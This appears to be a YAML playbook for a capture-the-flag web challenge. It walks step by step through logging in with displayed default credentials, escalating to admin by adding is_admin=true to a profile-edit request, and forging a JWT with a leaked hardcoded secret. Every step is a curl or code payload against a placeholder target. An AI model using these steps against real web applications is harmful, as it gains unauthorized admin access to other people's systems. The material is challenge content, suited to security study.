name: idor_post_privilege_escalation
category: web
tags: [idor, default_credentials, broken_authorization, privilege_escalation, jwt]
indicators:
  - "Login form with company/profile editing"
  - "Default credentials displayed on page (demo:demo)"
  - "Edit profile accepts is_admin parameter"
  - "Private content requires admin privilege"

tricks:
  - name: "Step 1: Find default credentials"
    when: "First access"
    how: "Login page displays demo:demo credentials"
    payload: |
      curl -s http://TARGET/ | grep -i demo
      # Found: demo:demo

  - name: "Step 2: Login to get session"
    when: "Found credentials"
    how: "POST to /token endpoint to get JWT cookie"
    payload: |
      curl -c cookies.txt -d 'username=demo&password=demo' http://TARGET/token

  - name: "Step 3: Discover IDOR in profile edit"
    when: "Logged in, explore features"
    how: "POST /edit_profile/{id} accepts is_admin without authorization check"
    payload: |
      # Analyze form fields or source code
      # Found: is_admin parameter is accepted but not validated

  - name: "Step 4: Exploit IDOR for privilege escalation"
    when: "Found is_admin parameter"
    how: "Add is_admin=true to profile edit request"
    payload: |
      curl -b cookies.txt -d 'name=demo&is_admin=true' http://TARGET/edit_profile/1

  - name: "Step 5: Access private content"
    when: "Privilege escalation successful"
    how: "View private jobs at /company/{id}/jobs"
    payload: |
      curl -b cookies.txt http://TARGET/company/1/jobs
      # FLAG is in private job description

  - name: "Alternative: JWT secret leak"
    when: "Need to forge JWT"
    how: "Source code contains hardcoded SECRET_KEY"
    payload: |
      # SECRET_KEY = 'a very secret key'
      jwt.encode({'sub': '2'}, 'a very secret key', algorithm='HS256')
